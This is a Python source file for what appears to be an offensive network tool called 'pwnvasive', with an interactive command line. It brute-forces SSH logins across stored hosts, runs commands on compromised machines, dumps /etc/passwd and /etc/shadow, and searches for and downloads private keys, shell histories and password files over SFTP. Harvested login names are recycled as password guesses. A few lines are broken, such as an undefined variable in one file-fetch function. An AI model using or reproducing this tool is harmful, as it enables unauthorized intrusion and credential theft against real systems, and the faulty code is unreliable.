#! /usr/bin/env python

import asyncio
import asyncssh
import json
import argparse
import logging
from aiocmd import aiocmd
from prompt_toolkit.completion import WordCompleter,NestedCompleter
import os
from enum import Enum,auto
import base64
import zlib
import re
from collections import OrderedDict,Counter
from itertools import islice
import functools
from contextvars import ContextVar

logging.basicConfig()
logging.getLogger("asyncio").setLevel(logging.WARNING)


class States(Enum):
    INVENTORIED = 1
    REACHED = 2
    CONNECTED = 3
    IDENTIFIED = 4
    HARVESTED = 5

async def gather_limited(n, *tasks, return_exceptions=False):
    semaphore = asyncio.Semaphore(n)
    async def _task(t):
        async with semaphore:
            return await t
    return await asyncio.gather(*(_task(t) for t in tasks),
                                return_exceptions=return_exceptions)

class JSONEnc(json.JSONEncoder):
    def default(self, o):
        if hasattr(o, "__json__"):
            return o.__json__()
        return json.JSONEncoder.default(self, o)

class NoCredsFound(Exception):
    def __str__(self):
        return f"{self.__class__.__name__}: no creds found for {self.args[0]}"


class OS(object):
    def __init__(self, node):
        self.node = node

class Linux(OS):
    re_interesting = re.compile(r"history|pass|shadow|/id_|\.(xls|key|pub)$")

    @property
    def file_list(self):
        return self.node.config.linuxfiles

    async def run(self, cmd):
        sout,serr = await self.node.run(cmd)
        return sout.strip()

    async def get_hostname(self):
        return await self.run("uname -n")
    async def get_os(self):
        return await self.run("uname -o")
    async def get_uid(self):
        return await self.run("id -u")

    async def get_all(self):
        keys = ["hostname", "os", "uid"]
        vals = await asyncio.gather(*[getattr(self, f"get_{k}")() for k in keys])
        return dict(zip(keys, vals))

    async def collect_logins(self):
        out,_ = await self.node.run("grep -v nologin /etc/passwd;grep -v ':!:' /etc/shadow")
        logins = set(x.split(":")[0] for x in out.splitlines())
        return list(logins)

    async def get_filenames(self):
        ## XXX Avoid smb and nfs ?
        ## uglier than find -fstype but works with busybox' find
        sout,_ = await self.node.run("awk '$3~/^(ext2|ext3|ext4|overlay|tmpfs|zfs|reiserfs|jfs|btrfs|xfs|minix|vfat|exfat|udf|ntfs|msdos|umsdos)$/{print $2}' /proc/mounts | while read a; do find $a -xdev -size -8k -print0 ; done")
        rawfnames = sout.split("\0")
        pubfiles = [ f for f in rawfnames if f.endswith(".pub") ]
        keyfiles = set([ f[:-4] for f in pubfiles ])
        interesting_files = set([ f for f in rawfnames if self.re_interesting.search(f) ])
        return list(interesting_files|keyfiles)


class Collection(object):
    def __init__(self, mapping, lst=None):
        self.mapping = mapping
        if lst is None:
            lst = []
        keys = [x.key for x in lst]
        if len(set(keys)) != len(keys):
            dups = [k for k,c in collections.Counter(keys).items() if c > 1]
            raise KeyError(f"Duplicate keys: {' '.join(dups)}")
        self.coll = OrderedDict([(x.key,x) for x in lst])
    def to_json(self):
        return list(self.coll.values())
    def __json__(self):
        return self.to_json()
    def __contains__(self, obj):
        return obj.key in self.coll
    def __len__(self):
        return len(self.coll)
    def __getitem__(self, selector):
        if isinstance(selector, Mapping):
            self.coll[selector.key]
        else:
            try:
                selector = int(selector)
            except:
                pass
            else:
                try:
                    return next(islice(self.coll.values(), selector, None))
                except StopIteration:
                    raise KeyError(selector)
            if type(selector) is str:
                selector = self.mapping.str2key(selector)
            return self.coll[selector]
    def select(self, selector):
        if selector in ["all", "*"]:
            return list(self.coll.values())
        else:
            return [self[selector]]
    def items(self):
        return self.coll.items()
    def values(self):
        return self.coll.values()
    def keys(self):
        return self.coll.keys()
    def __iter__(self):
        return iter(self.coll.values())
    def add(self, obj):
        if obj in self:
            raise KeyError(f"Object already present")
        self.coll[obj.key] = obj
    def add_batch(self, lst):
        n = 0
        for o in lst:
            if o not in self:
                self.coll[o.key] = o
                n += 1
        return n
    def update(self, obj):
        if obj not in self:
            raise KeyError(f"Key {obj.key} not found")
        self[obj].update(obj)
    def __repr__(self):
        return "<Collection: %s>" % ("\n".join(f"{o.key}" for o in self.values()))
    def string_menu(self):
        return "\n".join(f"{i:2}: {o}" for i,o in enumerate(self.values()))


### Mappings

class MappingMeta(type):
    def __new__(cls, name, bases, dct):
        _k = dct.get("_key")
        _f = dct.get("_fields")
        if _k is None:
            if _f:
                _k = (next(islice(_f.keys(), 1)),)
                dct["_key"] = _k
        _kt = dct.get("_keytype")
        if _kt is None and _k is not None:
            _kt = tuple(_f[k][1] for k in _k)
            dct["_keytype"] = _kt
        return super().__new__(cls, name, bases, dct)

class Mapping(object, metaclass=MappingMeta):
    _fields = {}
    _key = None # tuple. If None, metaclass will use the first field of _field.
    _keytype = None # automatically computed from _key and _fields by metaclass
    def __init__(self, config=None, **kargs):
        self.config = config
        self.values = {}
        for f,(v,_) in self._fields.items():
            self.values[f] = kargs.pop(f, v)
    def __getattr__(self, attr):
        if attr in self.values:
            return self.values[attr]
        raise AttributeError(attr)
    def __getitem__(self, item):
        return self.values[item]
    @property
    def key(self):
        return tuple(self.values[x] for x in self._key)
    @classmethod
    def str2key(cls, s):
        return tuple(t(v) for t,v in zip(cls._keytype, s.split(":")))
    @property
    def shortname(self):
        return ":".join(str(self.values.get(k, "")) for k in self._key)
    def update(self, other):
        for f in self._fields:
            if f in other:
                self.values[f] = other[f]
    @classmethod
    def from_json(cls, j, config=None):
        return cls(config=config, **j)
    def to_json(self):
        return self.values
    def __json__(self):
        return self.to_json()
    def __repr__(self):
        def fmtval(v):
            if type(v) is list:
                return [fmtval(x) for x in v]
            if type(v) is dict:
                return {k:fmtval(v) for k,v in v.items()}
            v = f"{v}"
            if len(v) > 20:
                v = f"{v[:5]}...({len(v)})...{v[-5:]}"
            return v
        r = ", ".join(f"{k}={fmtval(v)}" for k,v in self.values.items() if v is not None)
        return f"<{r}>"




class Net(Mapping):
    _fields = {
        "cidr": ("127.0.0.1/32", str),
        "scanned": (False, bool),
    }

class Logins(Mapping):
    _fields = {
        "login": (None, str),
    }

class Passwords(Mapping):
    _fields = {
        "password": (None, str),
    }

class SSHKeys(Mapping):
    _fields = {
        "key":      (None, str),
        "password": (None, str),
    }

class LinuxFiles(Mapping):
    _fields = {
        "path": ("", str),
    }

class Node(Mapping):
    _key = ("ip", "port")
    _fields = {
        "ip":                  ("127.0.0.1", str),
        "port":                (22, int),
        "controlled":          (False, bool),
        "reachable":           (False, bool),
        "jump_host":           (None, tuple),
        "ssh_login":           (None, str),
        "ssh_password":        (None, str),
        "ssh_key":             (None, str),
        "tested_credentials":  ([], list),
        "working_credentials": ([], list),
        "os":                  (None, str),
        "files":               ({}, dict),
    }

    def __init__(self, **kargs):
        super().__init__(**kargs)
        self.state = States.INVENTORIED
        self.session = None
        if self.values.get("os") == "linux":
            self.os = Linux(self)


    def ensure(state):
        def deco(func):
            @functools.wraps(func)
            async def wrapped(self, *args, **kargs):
                if self.state.value < state.value:
                    await getattr(self, f"ensure_{state.name}")()
                return await func(self, *args, **kargs)
            return wrapped
        return deco

    def skip_if(state):
        def deco(func):
            @functools.wraps(func)
            async def wrapped(self, *args, **kargs):
                if self.state.value >= state.value:
                    return True
                return await func(self, *args, **kargs)
            return wrapped
        return deco


    @skip_if(States.INVENTORIED)
    async def ensure_INVENTORIED(self):
        pass

    @skip_if(States.REACHED)
    async def ensure_REACHED(self):
        if self.jump_host is not None:
            raise NotImplementedError("Jump host connectivity test")
        await asyncio.open_connection(self.ip, self.port)
        self.state = States.REACHED
        self.values["reachable"] = True
        return True

    async def _test_creds(self, login, pwd):
        opt = asyncssh.SSHClientConnectionOptions(username=login, password=pwd, known_hosts=None)
        try:
            sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt)
        except Exception as e:
            print(f"Failed {login} {pwd}: {e}") 
            return [login,pwd],False,None
        return [login,pwd],True,sess

    @skip_if(States.CONNECTED)
    @ensure(States.REACHED)
    async def ensure_CONNECTED(self):
        # XXX manage keys
        if self.ssh_login is None or self.ssh_password is None:
            logins = [l.login for l in self.config.logins]
            passwords = [p.password for p in self.config.passwords]

            res = await asyncio.gather(*[
                self._test_creds(l,p)
                for l in logins for p in passwords
                if [l,p] not in self.tested_credentials])

            self.tested_credentials.extend([cred for cred,r,_ in res if not r])
            self.working_credentials.extend([cred for cred,r,_ in res if r])
            if self.working_credentials:
                self.state = States.CONNECTED
                self.values["ssh_login"],self.values["ssh_password"] = self.working_credentials[0]
                for _,r,sess in res:
                    if r:
                        break
            return None
        else:
            _,_,sess = await self._test_creds(self.ssh_login, self.ssh_password)
        self.session = NodeSession(self, sess)
        self.state = States.CONNECTED
        return self.session

    @skip_if(States.IDENTIFIED)
    @ensure(States.CONNECTED)    
    async def ensure_IDENTIFIED(self):
        sout,serr = await self._run("uname -o")
        if sout.startswith("Linux"):
            self.os = Linux(self)
            self.values["os"] = "linux"
            self.state = States.IDENTIFIED
            return True
        else:
            return False




    async def get_file(self, path):
        async with self.session.session.start_sftp_client() as sftp:
            f = await sftp.open(path, "rb")
            return await f.read()

    async def get_zfile(self, path):
        content = await self.get_file(path)
        return base64.b85encode(zlib.compress(c)).decode("ascii")

    async def get_filenames(self):
        return await self.os.get_filenames()

    async def get_glob(self, pattern):
        async with self.session.session.start_sftp_client() as sftp:
            return await sftp.glob(pattern)





    async def _run(self, cmd):
        r = await self.session.run(cmd)
        return r.stdout, r.stderr

    @ensure(States.CONNECTED)
    async def connect(self):
        return self.session

    @ensure(States.CONNECTED)
    async def run(self, cmd):
        return await self._run(cmd)


    async def _sftp_get_zfile(self, sftp, fname):
        f = await sftp.open(fname, "rb")
        content = await f.read()
        return base64.b85encode(zlib.compress(content)).decode("ascii")

    @ensure(States.IDENTIFIED)
    async def get_files(self, *paths):
        async with self.session.session.start_sftp_client() as sftp:
            try:
                lst = await sftp.glob(paths, error_handler=lambda x:None)
            except asyncssh.SFTPNoSuchFile:
                return {}

            content = await gather_limited(
                10,
                *(self._sftp_get_zfile(sftp, f)
                  for f in lst if f not in self.files),
                return_exceptions=True)
        d = { k:v for k,v in zip(lst, content) if type(v) is str }
        self.files.update(d)
        return d

    @ensure(States.IDENTIFIED)
    async def get_all_files(self):
        lst = [f.path for f in self.os.file_list]
        return await self.get_files(*lst)

    @ensure(States.IDENTIFIED)
    async def get_logins(self):
        return await self.os.collect_logins()





class NodeSession(object):
    def __init__(self, node, session):
        self.node = node
        self.session = session
    def __repr__(self):
        return f"<session to {self.node.ip}>"
    async def run(self, *args, **kargs):
        return await self.session.run(*args, **kargs)
    async def start_sftp_client(self, *args, **kargs):
        return await self.session.start_sftp_client(*args, **kargs)


DEFAULT_CONFIG = {
    "meta": { "version": "0.1", },
    "state": {
    },
}

class Config(object):
    _objects = {
        "networks": Net,
        "nodes": Node,
        "logins": Logins,
        "passwords": Passwords,
        "sshkeys": SSHKeys,
        "linuxfiles": LinuxFiles,
    }
    def __init__(self, fname=None, json_=None):
        self.fname = fname
        if json_ is not None:
            j = json_
        elif fname and os.path.isfile(fname):
            with open(fname) as f:
                j = json.load(f)
        else:
            j = DEFAULT_CONFIG
        self.config = j
        s = self.config["state"]
        self.objects = {}
        for f,c in self._objects.items():
            self.objects[f] = Collection(c, [c.from_json(d, config=self) for d in  s.get(f,[])])

    def __getattr__(self, attr):
        if attr in self.objects:
            return self.objects[attr]
        raise AttributeError(attr)


    def __enter__(self):
        return self
    def __exit__(self, *args):
        self.save()

    def save(self, fname=None):
        if fname is None:
            fname = self.fname
        self.config["state"].update(self.objects)
        with open(fname, "w") as f:
            json.dump(self.config, f, cls=JSONEnc)



class Link(object):
    async def __init__(self, node):
        self.node = node

class SSH(Link):
    pass


class PwnCLI(aiocmd.PromptToolkitCmd):
    def __init__(self, options):
        self.options = options
        self.cfg = options.config
        self.prompt = "pwnvasive > "
        super().__init__()
        self.sessions = []


    def str2map(self, s):
        return { k.strip():v.strip() for k,v in [x.strip().split("=",1) for x in s.split(",")] }


    ########## DEBUG

    def do_eval(self, cmd):
        print(eval(cmd))


    ########## MANAGE COLLECTIONS AND MAPPINGS

    def do_ls(self, obj=None, selector=None):
        if obj is None:
            print("\n".join(self.cfg.objects))
        else:
            if selector is None:
                print(self.cfg.objects[obj].string_menu())
            else:
                print(self.cfg.objects[obj][selector])

    def _ls_completions(self):
        return WordCompleter(list(self.cfg.objects))

    def do_add(self, obj, val=""):
        try:
            val = self.str2map(val)
        except:
            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
        else:
            Obj = self.cfg._objects[obj]
            o = Obj(config=self.cfg, **val)
            print(f"adding {o}")
            self.cfg.objects[obj].add(o)

    def _add_completions(self):
        return WordCompleter(list(self.cfg._objects))
#        XXX: fix nested completer
#        print({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })
#        return NestedCompleter({k: {f:None for f in v._fields} for k,v in self.cfg._objects.items() })


    def do_update(self, obj, selector, val):
        try:
            val = self.str2map(val)
        except:
            print(f"could not parse [{val}]. Should be field=value[,f=v[,...]]")
            raise

        objs = self.cfg.objects[obj].select(selector)
        for o in objs:
            print(f"Updating {o}")
            for f,(_,t) in o._fields.items():
                if f in val:
                    old = o.values.get(f,None)
                    new_ = t(val[f])
                    print(f"  + {f}: {old} --> {new_}")
                    o.values[f] = new_

    ########## CNX

    async def do_cnx(self, selector=None):
        if selector is None:
            for n in self.cfg.nodes:
                if n.session:
                    print(n.session)
        else:
            nodes = self.cfg.nodes.select(selector)
            for node in nodes:
                print(f"connecting to {node}")
                cnx = node.connect()
                t = asyncio.create_task(cnx)
                t.add_done_callback(self.cb_connected)

    def cb_connected(self, t):
        try:
            nsession = t.result()
        except NoCredsFound as e:
            print(f"Connection failed: {e}")
        else:
            if nsession:
                print(f"Connected to {nsession} (#{len(self.sessions)})")
                self.sessions.append(nsession)


    ########## RUN

    async def do_run(self, selector, cmd):

        async def run_and_print(node, cmd):
            try:
                sout,serr = await node.run(cmd)
            except Exception as e:
                print(f"-----[{node}]-----")
                print(e)
            else:
                print(f"-----[{node.session}]-----")
                print(sout)

        nodes = self.cfg.nodes.select(selector)
        res = await asyncio.gather(*[run_and_print(node, cmd) for node in nodes])


    ######### HARVEST

    async def do_info(self, selector):
        nodes = self.cfg.nodes.select(selector)
        async def print_info(node):
            try:
                await node.connect()
            except Exception as e:
                print(f"------[{node}]------")
                print(e)
            else:
                nfo = await node.os.get_all()
                print(f"------[{node}]------")
                print(json.dumps(nfo, indent=4))
        await asyncio.gather(*[print_info(node) for node in nodes])


    async def do_getfilenames(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.get_filenames())
            t.add_done_callback(lambda ctx:self.cb_get_filenames(node, ctx))

    def cb_get_filenames(self, node, t):
        fnames = t.result()
        coll = node.os.file_list
        fnameobjects = [coll.mapping(config=self.cfg, path=p) for p in fnames]
        newfilesnb = coll.add_batch(fnameobjects)
        print(f"{node.shortname}: retrieved {len(fnames)} file names. {newfilesnb} were new.")



    async def do_getfiles(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.get_all_files())
            t.add_done_callback(lambda ctx: self.cb_get_files(node, ctx))

    def cb_get_files(self, node, t):
        files = t.result()
        print(f"{node.shortname}: retrieved {len(files)} new files")



    async def do_getlogins(self, selector):
        nodes = self.cfg.nodes.select(selector)
        for node in nodes:
            t = asyncio.create_task(node.get_logins())
            t.add_done_callback(lambda ctx: self.cb_get_logins(node, ctx))

    def cb_get_logins(self, node, t):
        logins = t.result()
        olog = [self.cfg.logins.mapping(config=self.cfg, login=l) for l in logins]
        nlog = self.cfg.logins.add_batch(olog)
        opwd = [self.cfg.passwords.mapping(config=self.cfg, password=l) for l in logins]
        npwd = self.cfg.passwords.add_batch(opwd)
        print(f"{node.shortname}: {nlog} new logins, {npwd} new passwords")




def main(args=None):
    parser = argparse.ArgumentParser()
    parser.add_argument("database")

    options = parser.parse_args(args)

    with Config(options.database) as options.config:
        asyncio.run(PwnCLI(options).run())
#    asyncio.get_event_loop().run_until_complete(MyCLI().run())

if __name__ == "__main__":
    main()
